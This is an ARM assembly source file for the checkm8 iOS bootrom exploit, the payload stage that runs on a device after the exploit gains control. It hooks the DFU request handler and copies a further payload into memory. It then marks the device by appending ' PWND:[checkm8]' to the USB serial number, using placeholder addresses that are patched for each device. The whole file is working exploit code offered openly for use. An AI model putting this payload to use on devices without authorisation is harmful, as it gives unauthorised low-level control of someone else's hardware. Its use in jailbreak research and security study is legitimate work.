/* Copyright 2022 0x7ff
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
.text
.align 2

.pool
.set payload_dest,                        0x7FFFFF0
.set dfu_handle_request,                  0x7FFFFF1
.set payload_off,                         0x7FFFFF2
.set payload_sz,                          0x7FFFFF3
.set memcpy_addr,                         0x7FFFFF4
.set gUSBSerialNumber,                    0x7FFFFF5
.set usb_create_string_descriptor,        0x7FFFFF6
.set usb_serial_number_string_descriptor, 0x7FFFFF7
.set total_received,                      0x7FFFFF8

.arm
.global _main
_main:
	push {lr}
	ldr r0, =payload_dest
	ldr r3, =dfu_handle_request
	add r1, r0, #0x7
	str r1, [r3]
	adr r1, _main
	ldr r2, =payload_off
	add r1, r1, r2
	ldr r2, =payload_sz
	ldr r3, =memcpy_addr
	blx r3
	ldr r0, =gUSBSerialNumber
_find_zero_loop:
	add r0, r0, #1
	ldrb r1, [r0]
	cmp r1, #0
	bne _find_zero_loop
	adr r1, PWND_STR
	ldr r2, [r1]
	str r2, [r0]
	ldr r2, [r1, #0x4]
	str r2, [r0, #0x4]
	ldr r2, [r1, #0x8]
	str r2, [r0, #0x8]
	ldr r2, [r1, #0xC]
	str r2, [r0, #0xC]
	ldr r0, =gUSBSerialNumber
	ldr r1, =usb_create_string_descriptor
	blx r1
	ldr r1, =usb_serial_number_string_descriptor
	strb r0, [r1]
	mov r0, #0
	ldr r1, =total_received
	str r0, [r1]
	pop {pc}

PWND_STR:
.asciz " PWND:[checkm8]"
